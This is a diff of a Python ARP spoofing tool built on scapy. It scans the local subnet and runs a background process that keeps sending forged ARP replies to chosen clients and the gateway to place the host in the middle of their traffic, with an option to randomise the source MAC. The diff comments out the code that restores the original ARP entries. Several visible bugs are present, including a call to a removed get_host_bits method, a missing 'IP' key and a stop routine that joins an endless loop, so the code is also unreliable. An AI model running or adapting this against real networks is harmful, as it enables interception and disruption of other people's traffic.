@@ -5,6 +5,7 @@ from scapy.layers.inet import IP, ICMP
 import netifaces
 import time
 from logging import getLogger
+from multiprocessing import Process
 
 logger = getLogger(__name__)
 
@@ -12,17 +13,29 @@ logger = getLogger(__name__)
 class ARPSpoofer:
 
     def __init__(self):
-        self.interface = self.get_interface()
-        self.gateway_ip = self.get_gateway_ip()
-        self.gateway_mac = self.get_gateway_mac()
-        self.subnet_mask = self.get_subnet_mask()
-        self.host_ip = self.get_host_ip()
-        self.host_mac = self.get_host_mac()
-        self.mac_resolver = self.get_mac_resolver()
-        self.spoofed_clients = []
+        self.interface = None
+        gateways = netifaces.gateways()
+        if "default" in gateways and netifaces.AF_INET in gateways["default"]:
+            self.interface = gateways["default"][netifaces.AF_INET][1]
 
-    def get_mac_resolver(self):
-        resolver = {}
+        self.gateway_ip = None
+        gateways = netifaces.gateways()
+        if "default" in gateways and netifaces.AF_INET in gateways["default"]:
+            self.gateway_ip = gateways["default"][netifaces.AF_INET][0]
+
+        self.gateway_mac = None
+        packet = ARP(pdst=self.gateway_ip)
+        response = sr1(packet, timeout=3, verbose=False)
+        if response is not None:
+            self.gateway_mac = response.hwsrc
+        else:
+            raise ScapyNoDstMacException
+
+        self.subnet_mask = netifaces.ifaddresses(self.interface)[netifaces.AF_INET][0]["netmask"]
+        self.host_ip = netifaces.ifaddresses(self.interface)[netifaces.AF_INET][0]["addr"]
+        self.host_mac = netifaces.ifaddresses(self.interface)[netifaces.AF_LINK][0]["addr"]
+
+        self.mac_resolver = {}
         with open("oui.txt", "r", encoding="utf-8") as oui:
             text = oui.readlines()
             text = "\n".join(text)
@@ -31,49 +44,26 @@ class ARPSpoofer:
                 line = one_resolver_data.split("\n")[1]
                 mac = line.split("   ")[0]
                 address = line.split("\t")[-1]
-                resolver[mac] = address
-        return resolver
+                self.mac_resolver[mac] = address
 
-    def get_gateway_ip(self):
-        logger.debug("")
-        gateways = netifaces.gateways()
-        if "default" in gateways and netifaces.AF_INET in gateways["default"]:
-            return gateways["default"][netifaces.AF_INET][0]
-
-    def get_interface(self):
-        gateways = netifaces.gateways()
-        if "default" in gateways and netifaces.AF_INET in gateways["default"]:
-            return gateways["default"][netifaces.AF_INET][1]
-
-    def get_gateway_mac(self):
-        return self.get_mac_by_ip(self.gateway_ip)
-
-    def get_subnet_mask(self):
-        addresses = netifaces.ifaddresses(self.interface)
-        return addresses[netifaces.AF_INET][0]["netmask"]
-
-    def get_host_ip(self):
-        addresses = netifaces.ifaddresses(self.interface)
-        return addresses[netifaces.AF_INET][0]["addr"]
-
-    def get_host_mac(self):
-        addrs = netifaces.ifaddresses(self.interface)
-        return addrs[netifaces.AF_LINK][0]["addr"]
-
-    def get_mac_by_ip(self, ip_address):
-        packet = ARP(pdst=ip_address)
-        response = sr1(packet, timeout=3, verbose=False)
-
-        if response is not None:
-            return response.hwsrc
-        else:
-            raise ScapyNoDstMacException
+        self.spoofed_clients = []
+        self.spoofer_proc = None
 
     def scan_network(self, scanning_method):
         if scanning_method == "arp":
             host_bits = self.get_host_bits(self.subnet_mask)
+
+            octets = self.subnet_mask.split(".")
+            binary_mask = "".join([bin(int(octet))[2:].zfill(8) for octet in octets])
+            host_bits = 0
+            for bit in binary_mask:
+                if bit == "1":
+                    host_bits += 1
+                else:
+                    break
+
             network_ip = self.gateway_ip + "/" + str(host_bits)
-            print(f"Running scan on network address: {network_ip}")
+            logger.debug(f"Running scan on network address: {network_ip}")
 
             arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network_ip)
 
@@ -95,7 +85,7 @@ class ARPSpoofer:
 
             sorted_data = sorted(arp_responses, key=lambda x: x["MAC"])
 
-            print("IP\t\tMAC\t\t\tDEVICE")
+            logger.debug("IP\t\tMAC\t\t\tDEVICE")
             for client in sorted_data:
                 try:
                     mac_resolved = self.mac_resolver[
@@ -103,34 +93,57 @@ class ARPSpoofer:
                     ]
                 except Exception as e:
                     mac_resolved = ""
-                print(f'{client["IP"]}\t{client["MAC"]}\t{mac_resolved}')
+                logger.debug(f'{client["IP"]}\t{client["MAC"]}\t{mac_resolved}')
         elif scanning_method == 'nmap':
             pass
 
-    def spoof_mac(self, client_ip, spoof_source=False):
-
+    def spoof_client(self, client_ip, spoof_source=False):
         if not self.is_client_present(client_ip):
             raise Scapy_Exception(f"Client IP {client_ip} not present on network")
 
-        self.spoofed_clients.append(
-            {"original_IP": client_ip, "original_MAC": self.get_mac_by_ip(client_ip)}
-        )
+        packet = ARP(pdst=client_ip)
+        response = sr1(packet, timeout=3, verbose=False)
+        if response is not None:
+            mac = response.hwsrc
+            self.spoofed_clients.append(
+                {"original_IP": client_ip, "original_MAC": mac}
+            )
+            logger.debug("Client added to spoofed_clients list")
+        else:
+            raise ScapyNoDstMacException
 
-        packets = self._create_spoofed_packets(client_ip, spoof_source)
-        print("Sending packets for spoofing MAC")
+    def spoofing_func(self, spoof_source=False):
+        logger.debug("Spoofing these clients", self.spoofed_clients)
+        while True:
+            for client in self.spoofed_clients:
+                packets = self._create_spoofed_packets(client['original_IP'], client['original_MAC'], spoof_source)
+                logger.debug("Sending packets for spoofing MAC")
 
-        # while True:
-        [sendp(x, verbose=False) for x in packets]
-            # time.sleep(0.1)
+                [sendp(x, verbose=False) for x in packets]
+            time.sleep(0.1)
 
-    # def restore_mac(self):
-    #     for client in self.spoofed_clients:
-    #         self.spoofed_clients.remove(client)
-    #         if not self.is_client_present(client['IP']):
-    #             logger.exception(f'Client with IP {client['IP']} not present in network')
-    #             continue
-    #         packets = self._create_original_packets(client['IP'],client['MAC'])
-    #         [sendp(x, verbose=False) for x in packets]
+    def start_spoofing_process(self):
+        self.spoofer_proc = Process(target=self.spoofing_func)
+        self.spoofer_proc.start()
+        logger.debug("Started spoofing process")
+
+    def stop_spoofing_process(self):
+        if self.spoofer_proc != None:
+            self.spoofer_proc.join()
+            self.spoofer_proc = None
+        else:
+            raise Scapy_Exception(f"Spoofing process not active")
+        logger.debug("Stopped the spoofing process")
+
+    def remove_spoof_client(self, client_ip):
+        for client in self.spoofed_clients:
+            if client['original_IP'] == client_ip:
+                self.spoofed_clients.remove(client)
+                if not self.is_client_present(client['IP']):
+                    raise Scapy_Exception(f'Client with IP {client['IP']} not present in network')
+                break
+        logger.debug("Client removed from spoofing clients list")
+
 
     def is_client_present(self, client_ip):
         icmp_packet = (
@@ -145,65 +158,31 @@ class ARPSpoofer:
             return False
         return True
 
-    def get_host_bits(self, subnet_mask):
-        octets = subnet_mask.split(".")
-        binary_mask = "".join([bin(int(octet))[2:].zfill(8) for octet in octets])
-        host_bits = 0
-        for bit in binary_mask:
-            if bit == "1":
-                host_bits += 1
-            else:
-                break
-        return host_bits
 
-    def report_net_status(self):
-        return {
-            "gateway_ip": self.gateway_ip,
-            "gateway_mac": self.gateway_mac,
-            "interface": self.interface,
-            "subnet_mask": self.subnet_mask,
-            "host_ip": self.host_ip,
-            "host_mac": self.host_mac,
-            # 'scanned_hosts': self.scan_network()
-        }
+    # def report_net_status(self):
+    #     return {
+    #         "gateway_ip": self.gateway_ip,
+    #         "gateway_mac": self.gateway_mac,
+    #         "interface": self.interface,
+    #         "subnet_mask": self.subnet_mask,
+    #         "host_ip": self.host_ip,
+    #         "host_mac": self.host_mac,
+    #         # 'scanned_hosts': self.scan_network()
+    #     }
 
-    def _create_spoofed_packets(self, client_ip, spoof_source):
+    def _create_spoofed_packets(self, client_ip, client_mac, spoof_source):
         logger.debug("Creating packets for spoofing")
 
-        gateway_ip = self.gateway_ip
-        gateway_mac = self.gateway_mac
-        client_mac = self.get_mac_by_ip(client_ip)
         host_mac = self.host_mac
         if spoof_source:
             host_mac = self.generate_random_mac()
 
         packets = []
         client_packet = Ether(dst=client_mac, src=host_mac) / ARP(
-            pdst=client_ip, psrc=gateway_ip
+            pdst=client_ip, psrc=self.gateway_ip
         )
-        gateway_packet = Ether(dst=gateway_mac, src=host_mac) / ARP(
-            pdst=gateway_ip, psrc=client_ip
-        )
-
-        packets.append(client_packet)
-        packets.append(gateway_packet)
-
-        logger.debug(f"Packets generated: {packets}")
-
-        return packets
-
-    def _create_original_packets(self, client_ip, client_mac):
-        logger.debug("Creating packets for restoring original IP-MAC")
-
-        gateway_ip = self.gateway_ip
-        gateway_mac = self.gateway_mac
-
-        packets = []
-        client_packet = Ether(dst=ETHER_BROADCAST, src=client_mac) / ARP(
-            pdst=client_ip, psrc=gateway_ip
-        )
-        gateway_packet = Ether(dst=ETHER_BROADCAST, src=gateway_mac) / ARP(
-            pdst=gateway_ip, psrc=client_ip
+        gateway_packet = Ether(dst=self.gateway_mac, src=host_mac) / ARP(
+            pdst=self.gateway_ip, psrc=client_ip
         )
 
         packets.append(client_packet)
@@ -212,8 +191,36 @@ class ARPSpoofer:
         logger.debug(f"Packets generated: {packets}")
 
         return packets
+
+    # def _create_original_packets(self, client_ip, client_mac):
+    #     logger.debug("Creating packets for restoring original IP-MAC")
+
+    #     gateway_ip = self.gateway_ip
+    #     gateway_mac = self.gateway_mac
+
+    #     packets = []
+    #     client_packet = Ether(dst=ETHER_BROADCAST, src=client_mac) / ARP(
+    #         pdst=client_ip, psrc=gateway_ip
+    #     )
+    #     gateway_packet = Ether(dst=ETHER_BROADCAST, src=gateway_mac) / ARP(
+    #         pdst=gateway_ip, psrc=client_ip
+    #     )
+
+    #     packets.append(client_packet)
+    #     packets.append(gateway_packet)
+
+    #     logger.debug(f"Packets generated: {packets}")
+
+    #     return packets
 
     def generate_random_mac(self):
         mac = [random.randint(0x00, 0xFF) for _ in range(6)]
         mac[0] &= 0xFE  # Ensure the MAC address is unicast and not multicast
         return ":".join(map(lambda x: "%02x" % x, mac))
+
+
+
+
+
+# packets = self._create_original_packets(client['IP'],client['MAC'])
+# [sendp(x, verbose=False) for x in packets]
